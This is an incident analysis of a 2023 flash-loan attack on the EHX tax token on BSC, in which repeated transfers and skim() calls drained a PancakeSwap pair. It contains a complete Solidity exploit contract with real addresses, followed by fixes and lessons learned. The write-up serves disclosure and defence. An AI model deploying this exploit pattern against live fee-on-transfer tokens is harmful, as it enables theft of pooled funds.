# EHX Flash Loan Skim Attack Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | EHX Token |
| Date | 2023-11-10 |
| Chain | BSC (Binance Smart Chain) |
| Loss | Undisclosed |
| Attack Type | DODO Flash Loan + Repeated Transfer + Skim (DODO Flash Loan + Repeated Transfer + Skim) |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xddaaedcf226729def824cc5c14382c5980844d1f` |
| Attack Contract | `0x9d0d28f7b9a9e6d55abb9e41a87df133f316c68c` |
| Vulnerable Contract | `0xe1747a23C44f445062078e3C528c9F4c28C50a51` (EHX Token) |
| Fork Block | 33,503,911 |

## 2. Vulnerability Code Analysis

The EHX token had a tax mechanism that internally transferred a small amount of EHX to the pair or burned it on each transfer. The attacker borrowed WBNB via a DODO DVM flash loan to purchase a large amount of EHX, then transferred small amounts of EHX to the pair 2,000 times and repeatedly called `skim()` to extract the surplus accumulated by the tax mechanism.

```solidity
// Vulnerable pattern: tax accumulates in pair on EHX transfer
contract EHXToken {
    address public pair;
    uint256 public taxRate = 3; // 3%

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 tax = amount * taxRate / 100;
        // Tax sent directly to pair
        super._transfer(from, pair, tax);  // ← mismatch between pair reserve and balanceOf
        super._transfer(from, to, amount - tax);
        // sync() not called → surplus becomes skimmable
    }
}
```

**Vulnerability**: On every EHX transfer, tax is sent directly to the pair without calling `sync()`, causing a mismatch between the `reserve` and actual `balanceOf` to accumulate. Repeating small transfers 2,000 times builds up enough of this mismatch to generate profit via `skim()`.

### On-Chain Source Code

Source: Bytecode decompiled

```solidity
// File: EHX_decompiled.sol
    function transferFrom(address account, address recipient, uint256 shares) external returns (bool) {}  // ❌

// ...

    function transfer(address account, uint256 value) external returns (bool) {}  // ❌

// ...

    function transferOwnership(address account) external {}  // ❌
```

## 3. Attack Flow

```
Attacker [0xddaaedcf226729def824cc5c14382c5980844d1f]
  │
  ├─1─▶ DPPOracle.flashLoan(5.589 WBNB, 0, address(this), "_")
  │      [DVM DPPOracle: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]
  │      DPPFlashLoanCall callback triggered
  │
  ├─2─▶ WBNB.approve(Router, max) + WBNBToEHX()
  │      [Router: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │      WBNB → EHX swap to acquire large amount of EHX
  │
  ├─3─▶ Repeated transfer + skim (2,000 iterations):
  │      amountEHXToTransfer = EHX.balanceOf(this) / 300e6
  │      for (i=0; i<2000; i++):
  │          EHX.transfer(EHX_WBNB, amountEHXToTransfer)
  │          EHX_WBNB.skim(address(this))
  │      [EHX_WBNB: 0x3407c5398256cc242a7a22c373D9F252BaB37458]
  │      Tax accumulates → WBNB recovered via skim
  │
  ├─4─▶ EHX.approve(Router, max) + EHXToWBNB()
  │      Swap all remaining EHX back to WBNB
  │
  └─5─▶ WBNB.transfer(DPPOracle, 5.589 WBNB)
         Flash loan repaid + profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract EHXExploit {
    DVM DPPOracle = DVM(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Pair EHX_WBNB = IUniswapV2Pair(0x3407c5398256cc242a7a22c373D9F252BaB37458);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 EHX = IERC20(0xe1747a23C44f445062078e3C528c9F4c28C50a51);

    uint256 constant flashAmountWBNB = 5_589_328_092_301_986_679;

    function testExploit() public {
        DPPOracle.flashLoan(flashAmountWBNB, 0, address(this), bytes("_"));
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        WBNB.approve(address(Router), type(uint256).max);
        WBNBToEHX();

        uint256 amountEHXToTransfer = EHX.balanceOf(address(this)) / 300e6;
        for (uint256 i = 0; i < 2000; i++) {
            EHX.transfer(address(EHX_WBNB), amountEHXToTransfer);
            EHX_WBNB.skim(address(this));
        }

        EHX.approve(address(Router), type(uint256).max);
        EHXToWBNB();
        WBNB.transfer(address(DPPOracle), baseAmount);
    }

    function WBNBToEHX() private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(EHX);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    function EHXToWBNB() private {
        address[] memory path = new address[](2);
        path[0] = address(EHX);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            EHX.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | fee-on-transfer tax accumulation + reserve mismatch exploitation via repeated skim |
| Impact Scope | EHX/WBNB PancakeSwap pair |
| Explorer | [BSCscan](https://bscscan.com/address/0xe1747a23C44f445062078e3C528c9F4c28C50a51) |

## 6. Security Recommendations

```solidity
// Fix 1: Send tax to a separate address instead of the pair
address public feeCollector;

function _transfer(address from, address to, uint256 amount) internal {
    if (from != pair && to != pair) {
        uint256 tax = amount * taxRate / 100;
        super._transfer(from, feeCollector, tax); // fee collector instead of pair
        super._transfer(from, to, amount - tax);
    } else {
        super._transfer(from, to, amount);
    }
}

// Fix 2: Call sync() immediately after sending tax
function _transfer(address from, address to, uint256 amount) internal {
    uint256 tax = amount * taxRate / 100;
    super._transfer(from, pair, tax);
    IUniswapV2Pair(pair).sync(); // update reserve immediately
    super._transfer(from, to, amount - tax);
}

// Fix 3: Defend against skim — call sync() periodically
function syncPair() external {
    IUniswapV2Pair(pair).sync();
}
```

## 7. Lessons Learned

1. **fee-on-transfer + pair tax**: Tokens like EHX that send tax directly to the pair continuously generate a mismatch between `reserve` and `balanceOf`. This creates an attack surface that can be repeatedly drained via `skim()`.
2. **2,000-iteration repeated skim**: The feasibility of 2,000 repeated small transfers is enabled by BSC's low gas costs. This is why such repetitive attacks are more frequent on BSC than on Ethereum.
3. **Tax token design principle**: Designs that send tax (fee) directly to an AMM pair must be avoided. Taxes should be collected to a separate address or contract and periodically converted/distributed.
4. **DODO DVM flash loan**: DODO DVM flash loans are utilized even in small-scale attacks (undisclosed loss). The ability to profit with a relatively small flash loan (5.5 WBNB) is characteristic of small-scale attacks on BSC.